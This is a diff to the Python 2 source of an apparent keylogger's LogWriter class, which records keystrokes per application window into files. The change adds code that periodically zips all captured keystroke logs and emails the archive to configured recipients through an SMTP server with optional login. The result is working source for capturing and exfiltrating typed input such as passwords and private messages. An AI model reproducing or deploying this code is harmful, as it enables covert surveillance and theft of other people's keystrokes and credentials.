@@ -6,37 +6,49 @@ import sys
 #from threading import Timer
 import mytimer
 
+#the following are needed for zipping the logfiles
+import zipfile
+import zlib
+
+# the following are needed for automatic emailing
+import smtplib
+from email.MIMEMultipart import MIMEMultipart
+from email.MIMEBase import MIMEBase
+from email.MIMEText import MIMEText
+from email.Utils import COMMASPACE, formatdate
+from email import Encoders
+
 class LogWriter:
 
-    def __init__(self, options):
+    def __init__(self, settings):
         
-        self.options = options
+        self.settings = settings
         
-        self.options.dirName = os.path.normpath(self.options.dirName)
+        self.settings['dirname'] = os.path.normpath(self.settings['dirname'])
         
         try:
-            os.makedirs(self.options.dirName, 0777) 
+            os.makedirs(self.settings['dirname'], 0777) 
         except OSError, detail:
             if(detail.errno==17):  #if directory already exists, swallow the error
                 pass
             else:
-                self.PrintDebug(sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
+                self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
         except:
-            self.PrintDebug("Unexpected error: " + sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
+            self.PrintDebug("Unexpected error: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
         
         self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")      #regexp filter for the non-allowed characters in windows filenames.
         
         self.writeTarget = ""
-        if self.options.systemLog != None:
+        if self.settings['systemlog'] != 'None':
             try:
-                self.systemlog = open(os.path.join(self.options.dirName, self.options.systemLog), 'a')
+                self.systemlog = open(os.path.join(self.settings['dirname'], self.settings['systemlog']), 'a')
             except OSError, detail:
                 if(detail.errno==17):  #if file already exists, swallow the error
                     pass
                 else:
-                    self.PrintDebug(sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
+                    self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
             except:
-                self.PrintDebug("Unexpected error: " + sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
+                self.PrintDebug("Unexpected error: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
 
         # we only want to initalize the timer once, and then only AFTER we have some file opened to self.log
         # so this will be our "one time use" flag
@@ -46,40 +58,44 @@ class LogWriter:
             #~ self.errorlog = open(os.path.join(self.options.dirName, "errorlog.txt"), 'a')
             #~ self.savestderr = sys.stderr    #save stderr just in case we want to restore it later
             #~ sys.stderr = self.errorlog
-            
+        
+        # Set up the subset of keys that we are going to log
+        self.asciiSubset = [8,9,10,13,27]           #backspace, tab, line feed, carriage return, escape
+        self.asciiSubset.extend(range(32,255))      #all normal printable chars
+        
+        if self.settings['parsebackspace'] == 'True':
+            self.asciiSubset.remove(8)              #remove backspace from allowed chars if needed
+        if self.settings['parseescape'] == 'True':
+            self.asciiSubset.remove(27)             #remove escape from allowed chars if needed
+
+        # initialize the automatic zip and email timer
+        self.emailtimer = mytimer.MyTimer(float(self.settings['emailinterval'])*60, 0, self.ZipAndEmailTimerAction)
+        self.emailtimer.start()
 
     def WriteToLogFile(self, event):
         loggable = self.TestForNoLog(event)     # see if the program is in the no-log list.
                 
         if not loggable:
-            if self.options.debug: self.PrintDebug("not loggable, we are outta here\n")
+            if self.settings['debug']: self.PrintDebug("not loggable, we are outta here\n")
             return
         
-        if self.options.debug: self.PrintDebug("loggable, lets log it\n")
+        if self.settings['debug']: self.PrintDebug("loggable, lets log it\n")
         
         loggable = self.OpenLogFile(event) #will return true if log file has been opened without problems
         
         #start our autoflush timer, since a log file has been opened at this point, for the first time
         if loggable and self.flushTimerInitialized == False:
             self.flushTimerInitialized = True
-            self.timer = mytimer.MyTimer(self.options.interval, 0, self.TimerAction)
-            self.timer.start()
+            self.flushtimer = mytimer.MyTimer(float(self.settings['flushinterval']), 0, self.FlushLogWriteBuffers)
+            self.flushtimer.start()
         
         if not loggable:
             self.PrintDebug("some error occurred when opening the log file. we cannot log this event. check systemlog (if specified) for details.\n")
             return
 
-        asciiSubset = [8,9,10,13,27]           #backspace, tab, line feed, carriage return, escape
-        asciiSubset.extend(range(32,255))      #all normal printable chars
-        
-        if self.options.parseBackspace == True:
-            asciiSubset.remove(8)              #remove backspace from allowed chars if needed
-        if self.options.parseEscape == True:
-            asciiSubset.remove(27)             #remove escape from allowed chars if needed
-
-        if event.Ascii in asciiSubset:
+        if event.Ascii in self.asciiSubset:
             self.PrintStuff(chr(event.Ascii))
-        if event.Ascii == 13 and self.options.addLineFeed == True:
+        if event.Ascii == 13 and self.settings['addlinefeed'] == 'True':
             self.PrintStuff(chr(10))                 #add line feed after CR,if option is set
             
         #we translate all the special keys, such as arrows, backspace, into text strings for logging
@@ -88,47 +104,104 @@ class LogWriter:
             self.PrintStuff('[KeyName:' + event.Key + ']')
         
         #translate backspace into text string, if option is set.
-        if event.Ascii == 8 and self.options.parseBackspace == True:
+        if event.Ascii == 8 and self.settings['parsebackspace'] == 'True':
             self.PrintStuff('[KeyName:' + event.Key + ']')
         
         #translate escape into text string, if option is set.
-        if event.Ascii == 27 and self.options.parseEscape == True:
+        if event.Ascii == 27 and self.settings['parseescape'] == True:
             self.PrintStuff('[KeyName:' + event.Key + ']')
 
-        if event.Key == self.options.flushKey:
+        if event.Key == self.settings['flushkey']:
             self.log.flush()
-            if self.options.systemLog != None: self.systemlog.flush()
+            if self.settings['systemlog'] != 'None': self.systemlog.flush()
 
     def TestForNoLog(self, event):
         '''This function returns False if the process name associated with an event
         is listed in the noLog option, and True otherwise.'''
         
         self.processName = self.GetProcessNameFromHwnd(event.Window)
-        if self.options.noLog != None:
-            for path in self.options.noLog:
+        if self.settings['nolog'] != 'None':
+            for path in self.settings['nolog'].split(';'):
                 if os.stat(path) == os.stat(self.processName):    #we use os.stat instead of comparing strings due to multiple possible representations of a path
                     return False
         return True
 
-    def TimerAction(self):
+    def FlushLogWriteBuffers(self):
         self.PrintDebug("flushing file write buffer due to timer\n")
         self.log.flush()
+        if self.settings['systemlog'] != 'None': self.systemlog.flush()
 
+    def ZipLogFiles(self):
+        os.chdir(self.settings['dirname'])
+        myzip = zipfile.ZipFile(self.settings['ziparchivename'], "w", zipfile.ZIP_DEFLATED)
+        for root, dirs, files in os.walk(os.curdir):
+            for fname in files:
+                if fname != self.settings['ziparchivename']:
+                    myzip.write(os.path.join(root,fname).split("\\",1)[1])
+    #            myzip.write(fname)
+        myzip.close()
+        myzip = zipfile.ZipFile(self.settings['ziparchivename'], "r", zipfile.ZIP_DEFLATED)
+        if myzip.testzip() != None:
+            self.PrintDebug("Warning: Zipfile did not pass check.\n")
+        myzip.close()
+        
+    def SendZipByEmail(self):
+        
+        #def sendMail(to, fro, subject, text, files=[],server="localhost"):
+        #~ assert type(to)==list
+        #~ assert type(files)==list
+        #fro = "Expediteur <expediteur@mail.com>"
+
+        # set up the message
+        msg = MIMEMultipart()
+        msg['From'] = self.settings['smtpfrom']
+        msg['To'] = COMMASPACE.join(self.settings['smtpto'].split(";"))
+        msg['Date'] = formatdate(localtime=True)
+        msg['Subject'] = self.settings['smtpsubject']
+
+        msg.attach( MIMEText(self.settings['smtpmessagebody']) )
+
+        for file in [os.path.join(self.settings['dirname'], self.settings['ziparchivename'])]:
+            part = MIMEBase('application', "octet-stream")
+            part.set_payload( open(file,"rb").read() )
+            Encoders.encode_base64(part)
+            part.add_header('Content-Disposition', 'attachment; filename="%s"'
+                           % os.path.basename(file))
+            msg.attach(part)
+
+        # set up the server and send the message
+        mysmtp = smtplib.SMTP(self.settings['smtpserver'])
+        
+        if self.settings['debug']: 
+            mysmtp.set_debuglevel(1)
+        if self.settings['smtpneedslogin'] == 'True':
+            mysmtp.login(self.settings['smtpusername'],self.settings['smtppassword'])
+        sendingresults=mysmtp.sendmail(self.settings['smtpfrom'], self.settings['smtpto'].split(";"), msg.as_string())
+        self.PrintDebug("Email sending errors (if any): " + str(sendingresults) + "\n")
+        mysmtp.quit()
+
+    def ZipAndEmailTimerAction(self):
+        self.PrintDebug("Sending mail to " + self.settings['smtpto'] + "\n")
+        self.log.flush()
+        if self.settings['systemlog'] != 'None': self.systemlog.flush()
+        self.ZipLogFiles()
+        self.SendZipByEmail()
+    
     def OpenLogFile(self, event):
         
-        if self.options.oneFile != None:
+        if self.settings['onefile'] != 'None':
             if self.writeTarget == "":
-                self.writeTarget = os.path.join(os.path.normpath(self.options.dirName), os.path.normpath(self.options.oneFile))
+                self.writeTarget = os.path.join(os.path.normpath(self.settings['dirname']), os.path.normpath(self.settings['onefile']))
                 try:
                     self.log = open(self.writeTarget, 'a')
                 except OSError, detail:
                     if(detail.errno==17):  #if file already exists, swallow the error
                         pass
                     else:
-                        self.PrintDebug(sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
+                        self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
                         return False
                 except:
-                    self.PrintDebug("Unexpected error: " + sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
+                    self.PrintDebug("Unexpected error: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
                     return False
 
                 self.PrintDebug("writing to: " + self.writeTarget + "\n")
@@ -142,27 +215,27 @@ class LogWriter:
         
         #make sure our filename plus path is not longer than 255 characters, as per filesystem limit.
         #filename = filename[0:200] + ".txt"     
-        if len(os.path.join(self.options.dirName, subDirName, filename)) > 255:
-            if len(os.path.join(self.options.dirName, subDirName)) > 250:
+        if len(os.path.join(self.settings['dirname'], subDirName, filename)) > 255:
+            if len(os.path.join(self.settings['dirname'], subDirName)) > 250:
                 self.PrintDebug("root log dir + subdirname is longer than 250. cannot log.")
                 return False
             else:
-                filename = filename[0:255-len(os.path.join(self.options.dirName, subDirName))-4] + ".txt"  
+                filename = filename[0:255-len(os.path.join(self.settings['dirname'], subDirName))-4] + ".txt"  
         
 
         #we have this writetarget conditional to make sure we dont keep opening and closing the log file when all inputs are going
         #into the same log file. so, when our new writetarget is the same as the previous one, we just write to the same 
         #already-opened file.
-        if self.writeTarget != os.path.join(self.options.dirName, subDirName, filename): 
+        if self.writeTarget != os.path.join(self.settings['dirname'], subDirName, filename): 
             if self.writeTarget != "":
                 self.PrintDebug("flushing and closing old log\n")
                 self.log.flush()
                 self.log.close()
-            self.writeTarget = os.path.join(self.options.dirName, subDirName, filename)
+            self.writeTarget = os.path.join(self.settings['dirname'], subDirName, filename)
             self.PrintDebug("writeTarget:" + self.writeTarget + "\n")
             
             try:
-                os.makedirs(os.path.join(self.options.dirName, subDirName), 0777)
+                os.makedirs(os.path.join(self.settings['dirname'], subDirName), 0777)
             except OSError, detail:
                 if(detail.errno==17):  #if directory already exists, swallow the error
                     pass
@@ -188,15 +261,15 @@ class LogWriter:
         return True
 
     def PrintStuff(self, stuff):
-        if not self.options.debug:
+        if not self.settings['debug']:
             self.log.write(stuff)
         else:
             self.PrintDebug(stuff)
 
     def PrintDebug(self, stuff):
-        if self.options.debug:
+        if self.settings['debug']:
             sys.stdout.write(stuff)
-        if self.options.systemLog != None:
+        if self.settings['systemlog'] != 'None':
             self.systemlog.write(stuff)
 
     def GetProcessNameFromHwnd(self, hwnd):
